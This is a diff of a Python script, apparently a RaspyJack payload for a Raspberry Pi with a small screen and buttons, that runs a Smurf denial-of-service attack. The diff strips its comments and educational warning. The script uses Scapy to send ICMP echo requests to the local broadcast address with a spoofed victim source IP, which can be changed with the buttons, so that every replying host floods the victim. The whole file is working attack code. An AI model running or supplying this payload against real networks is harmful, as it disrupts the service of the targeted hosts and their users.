@@ -1,39 +1,19 @@
 #!/usr/bin/env python3
 import sys
-sys.path.append('/root/Raspyjack/')
-"""
-RaspyJack *payload* – **DoS Attack: Smurf Attack**
-===================================================
-A classic amplified Denial of Service (DoS) attack. It works by sending
-ICMP Echo Requests (pings) to the network's broadcast address, while
-spoofing the source IP to be the victim's IP address.
-
-All hosts on the network that respond to broadcast pings will then send
-an ICMP Echo Reply to the victim, overwhelming it with traffic.
-
-**!!! WARNING !!!**
-This is a DENIAL OF SERVICE attack. Most modern, well-configured
-networks are immune to this. It is included for educational purposes.
-Use with extreme caution.
-"""
-
-import os, sys, subprocess, signal, time, threading
+import os
+import time
+import signal
+import subprocess
+import threading
 sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
 import RPi.GPIO as GPIO
 import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
+from scapy.all import *
+conf.verb = 0
 
-try:
-    from scapy.all import *
-    conf.verb = 0
-except ImportError:
-    sys.exit(1)
+VICTIM_IP = "192.168.1.100"
 
-# --- CONFIGURATION ---
-# The IP of the victim you want to flood
-VICTIM_IP = "192.168.1.100" # Will be configurable
-
-# --- GPIO & LCD ---
 PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
 GPIO.setmode(GPIO.BCM)
 for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
@@ -41,16 +21,15 @@ LCD = LCD_1in44.LCD()
 LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
 FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
-FONT = ImageFont.load_default() # Added for general text
+FONT = ImageFont.load_default()
 
-# --- Globals & Shutdown ---
 running = True
 attack_thread = None
 attack_stop_event = threading.Event()
 packet_count = 0
 broadcast_ip = None
-current_ip_input = VICTIM_IP # Initial value for IP input
-ip_input_cursor_pos = 0 # Cursor position for IP input
+current_ip_input = VICTIM_IP
+ip_input_cursor_pos = 0
 
 def cleanup(*_):
     global running
@@ -61,11 +40,10 @@ def cleanup(*_):
 signal.signal(signal.SIGINT, cleanup)
 signal.signal(signal.SIGTERM, cleanup)
 
-# --- UI ---
 def show_message(lines, color="lime"):
     img = Image.new("RGB", (128, 128), "black")
     d = ImageDraw.Draw(img)
-    font = FONT_TITLE # Use FONT_TITLE for messages
+    font = FONT_TITLE
     y = 40
     for line in lines:
         bbox = d.textbbox((0, 0), line, font=font)
@@ -105,7 +83,7 @@ def draw_ui(screen_state="main", status: str = ""):
 def handle_ip_input_logic(initial_ip):
     global current_ip_input, ip_input_cursor_pos
     current_ip_input = initial_ip
-    ip_input_cursor_pos = len(initial_ip) - 1 # Start cursor at end
+    ip_input_cursor_pos = len(initial_ip) - 1
     
     draw_ui("ip_input")
     
@@ -114,22 +92,21 @@ def handle_ip_input_logic(initial_ip):
         for name, pin in PINS.items():
             if GPIO.input(pin) == 0:
                 btn = name
-                while GPIO.input(pin) == 0: # Debounce
+                while GPIO.input(pin) == 0:
                     time.sleep(0.05)
                 break
         
-        if btn == "KEY3": # Cancel IP input
+        if btn == "KEY3":
             return None
         
-        if btn == "OK": # Confirm IP
-            # Validate IP format
+        if btn == "OK":
             parts = current_ip_input.split('.')
             if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                 return current_ip_input
             else:
                 show_message(["Invalid IP!", "Try again."], "red")
                 time.sleep(2)
-                current_ip_input = initial_ip # Reset to initial
+                current_ip_input = initial_ip
                 ip_input_cursor_pos = len(initial_ip) - 1
                 draw_ui("ip_input")
         
@@ -148,12 +125,11 @@ def handle_ip_input_logic(initial_ip):
                     digit = int(current_char)
                     if btn == "UP":
                         digit = (digit + 1) % 10
-                    else: # DOWN
+                    else:
                         digit = (digit - 1 + 10) % 10
                     char_list[ip_input_cursor_pos] = str(digit)
                     current_ip_input = "".join(char_list)
                 elif current_char == '.':
-                    # Cannot change dot, move cursor
                     if btn == "UP":
                         ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                     else:
@@ -163,15 +139,11 @@ def handle_ip_input_logic(initial_ip):
         time.sleep(0.1)
     return None
 
-# --- Attack Logic ---
 def get_broadcast_ip(interface="eth0"):
-    """Determines the broadcast IP for a given interface."""
     try:
-        # Use Scapy to get interface information
         iface_info = get_if_addr(interface)
         if iface_info:
             net, mask = get_if_addr(interface), get_if_mask(interface)
-            # Calculate broadcast address
             ip_int = int(IPv4Address(net))
             mask_int = int(IPv4Address(mask))
             broadcast_int = ip_int | (~mask_int & 0xFFFFFFFF)
@@ -186,13 +158,12 @@ def smurf_worker():
         print("Error: Broadcast IP not found.", file=sys.stderr)
         return
 
-    # We are sending a ping from VICTIM_IP to the broadcast address
     p = IP(src=VICTIM_IP, dst=broadcast_ip) / ICMP()
     
     while not attack_stop_event.is_set():
-        send(p, iface="eth0", verbose=0) # Assuming eth0 for sending
+        send(p, iface="eth0", verbose=0)
         packet_count += 1
-        time.sleep(0.5) # Don't overwhelm the local CPU
+        time.sleep(0.5)
 
 def start_attack():
     global attack_thread, packet_count
@@ -207,73 +178,63 @@ def stop_attack():
     if attack_thread:
         attack_thread.join(timeout=2)
 
-# --- Main Loop ---
-try:
-    # Check for scapy dependency
+if __name__ == "__main__":
     try:
-        from scapy.all import *
-    except ImportError:
-        show_message(["ERROR:", "Scapy not found!"], "red")
-        time.sleep(3)
-        raise SystemExit("Scapy not found.")
+        broadcast_ip = get_broadcast_ip("eth0")
+        if not broadcast_ip:
+            show_message(["ERROR:", "No Broadcast IP!", "Check eth0."], "red")
+            time.sleep(3)
+            raise SystemExit("Could not determine broadcast IP.")
 
-    # Get broadcast IP at startup
-    broadcast_ip = get_broadcast_ip("eth0") # Assuming eth0 for now
-    if not broadcast_ip:
-        show_message(["ERROR:", "No Broadcast IP!", "Check eth0."], "red")
-        time.sleep(3)
-        raise SystemExit("Could not determine broadcast IP.")
+        current_screen = "main"
 
-    current_screen = "main" # State variable for the main loop
-
-    while running:
-        if current_screen == "main":
-            draw_ui("main")
+        while running:
+            if current_screen == "main":
+                draw_ui("main")
+                
+                if GPIO.input(PINS["KEY3"]) == 0:
+                    cleanup()
+                    break
+                
+                if GPIO.input(PINS["OK"]) == 0:
+                    start_attack()
+                    current_screen = "attacking"
+                    time.sleep(0.3)
+                
+                if GPIO.input(PINS["KEY1"]) == 0:
+                    current_ip_input = VICTIM_IP
+                    current_screen = "ip_input"
+                    time.sleep(0.3)
             
-            if GPIO.input(PINS["KEY3"]) == 0:
-                cleanup()
-                break
-            
-            if GPIO.input(PINS["OK"]) == 0:
-                # Start attack
-                start_attack()
-                current_screen = "attacking"
-                time.sleep(0.3) # Debounce
-            
-            if GPIO.input(PINS["KEY1"]) == 0: # Edit Victim IP
-                current_ip_input = VICTIM_IP
-                current_screen = "ip_input"
-                time.sleep(0.3) # Debounce
-        
-        elif current_screen == "ip_input":
-            new_ip = handle_ip_input_logic(current_ip_input)
-            if new_ip:
-                VICTIM_IP = new_ip
-            current_screen = "main"
-            time.sleep(0.3) # Debounce
-        
-        elif current_screen == "attacking":
-            draw_ui("attacking", "ACTIVE")
-            if GPIO.input(PINS["KEY3"]) == 0:
-                stop_attack()
+            elif current_screen == "ip_input":
+                new_ip = handle_ip_input_logic(current_ip_input)
+                if new_ip:
+                    VICTIM_IP = new_ip
                 current_screen = "main"
-                time.sleep(0.3) # Debounce
-            if GPIO.input(PINS["OK"]) == 0:
-                stop_attack()
-                current_screen = "main"
-                time.sleep(0.3) # Debounce
+                time.sleep(0.3)
+            
+            elif current_screen == "attacking":
+                draw_ui("attacking", "ACTIVE")
+                if GPIO.input(PINS["KEY3"]) == 0:
+                    stop_attack()
+                    current_screen = "main"
+                    time.sleep(0.3)
+                if GPIO.input(PINS["OK"]) == 0:
+                    stop_attack()
+                    current_screen = "main"
+                    time.sleep(0.3)
+                time.sleep(0.1)
+
             time.sleep(0.1)
 
-        time.sleep(0.1)
-
-except (KeyboardInterrupt, SystemExit):
-    pass
-except Exception as e:
-    print(f"[ERROR] {e}", file=sys.stderr)
-    show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
-    time.sleep(3)
-finally:
-    cleanup()
-    LCD.LCD_Clear()
-    GPIO.cleanup()
-    print("Smurf Attack payload finished.")
+    except (KeyboardInterrupt, SystemExit):
+        pass
+    except Exception as e:
+        print(f"[ERROR] {e}", file=sys.stderr)
+        show_message(["CRITICAL ERROR:", str(e)[:20]], "red")
+        time.sleep(3)
+    finally:
+        cleanup()
+        LCD.LCD_Clear()
+        GPIO.cleanup()
+        print("Smurf Attack payload finished.")
